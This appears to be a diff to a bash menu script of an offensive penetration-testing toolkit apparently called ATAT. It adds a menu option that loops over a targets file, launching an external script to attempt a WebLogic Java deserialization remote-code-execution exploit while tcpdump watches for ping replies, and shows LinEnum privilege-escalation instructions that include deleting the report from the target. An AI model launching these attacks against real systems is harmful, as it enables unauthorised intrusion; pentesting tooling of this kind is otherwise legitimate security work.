@@ -197,9 +197,11 @@ echo -e "\E[1;34m:::\e[97m[12]\e[32mMake Your Escape     \e[97m [Float Away...Wi
 tput sgr0
 echo -e "\E[1;34m===\e[97m[13]\e[34mPrivilege Escalation  \e[97m[PrivEsc Options & Techniques]   \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m:::\e[97m[00]\e[95mReset & Recharge      \e[97m[Wipe All Scan Output To Lock A New Target]  \E[1;34m"
+echo -e "\E[1;34m===\e[97m[14]\e[95mImperial Research Lab \e[97m[Proof Of Concept Techniques]   \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m===\e[97m[0] \e[31mExit                  \e[97m[Exit ATAT]   \E[1;34m"
+echo -e "\E[1;34m:::\e[97m[00]\e[31mReset & Recharge      \e[97m[Wipe All Scan Output To Lock A New Target]  \E[1;34m"
+tput sgr0
+echo -e "\E[1;34m===\e[97m[0] \e[90mExit                  \e[97m[Exit ATAT]   \E[1;34m"
 tput sgr0
 
 echo -e "\E[1;34m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
@@ -2000,6 +2002,44 @@ do
 	echo -e "\E[1;34m::::: \e[97mType \"./LinEnum.sh -r report -e /tmp/ -t\" To Launch A Thorough LinEnum Scan \E[1;34m:::::" 
 	echo -e "\E[1;34m::::: \e[97mYour Completed LinEnum Report Can Be Found On Your Target Here: /tmp/report \E[1;34m:::::"
 	echo -e "\E[1;34m::::: \e[97mDon't Forget To Delete The Report On Your Target Once You're Done - \"rm /tmp/report\" \E[1;34m:::::"
+			;;
+		"Main Menu")
+            ~/ATAT/ATAT.sh
+            ;;
+        "Quit")
+            echo "Aufiederszehn" && exit 1
+            ;;
+        *) echo invalid option;;
+    esac
+done
+
+;;
+
+  "14" | "14" )
+  echo -e "\E[1;34m::::: \e[97mImperial Research Laboratory \E[1;34m:::::"
+  echo -e "\E[1;34m::::: \e[97m***Unstable / Under-Developed Weaponry*** \E[1;34m:::::"
+  echo -e "\E[1;34m::::: \e[97mFire Safety Protocols & All Appropriate Safety Percautions Are Required \E[1;34m:::::"
+PS3='Enter your choice: ENTER=Options Menu | 2=Main Menu | 3=QUIT: '
+options=("Weblogic Java Deserialization RCE" "Main Menu" "Quit")
+select opt in "${options[@]}"
+do
+    case $opt in
+		"Weblogic Java Deserialization RCE")
+	    echo -e "\E[1;34m::::: \e[97mThis Will Attempt To Exploit A Java Deserializatoin RCE Vulnerability In Weblogic \E[1;34m:::::"		
+	    echo -e "\E[1;34m::::: \e[97mIf Successful, A Ping Command Will Be Executed On The Target Machine \E[1;34m:::::"
+	    echo -e "\E[1;34m::::: \e[97mThis Will Result In IMCP Echo Packets Showing Up In Yout TCPDUMP Window From The Target IP \E[1;34m:::::" 
+	xterm -e tcpdump -nni eth0 -e icmp[icmptype] == 8 &
+	read -p 'Set PORT (usually 7001): ' userport;	
+	inputfile=~/ATAT/MSF_targets.txt
+	for IP in $(cat $inputfile)
+	do
+        xterm -e python weblogic_LinuxPing.py $IP $userport &
+        sleep 3
+    done    
+			echo -e "\E[1;34m::::: \e[97mIF THIS FAILS TO GENERATE ICMP RESPONSES IN YOUR TCPDUMP WINDOW ON YOUR FIRST TRY, TRY AGAIN AT LEAST ONE OR TWO MORE TIMES! \E[1;34m:::::" 
+			echo -e "\E[1;34m::::: \e[97mThe command may need to be run several times until ping replies are seen in the first terminal window (the one that has tcpdump running). \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mTake screen shots of both terminal windows after successful RCE to demonstrate the exploitability of the vulnerability for your report. \E[1;34m:::::"
+            echo ""
 			;;
 		"Main Menu")
             ~/ATAT/ATAT.sh
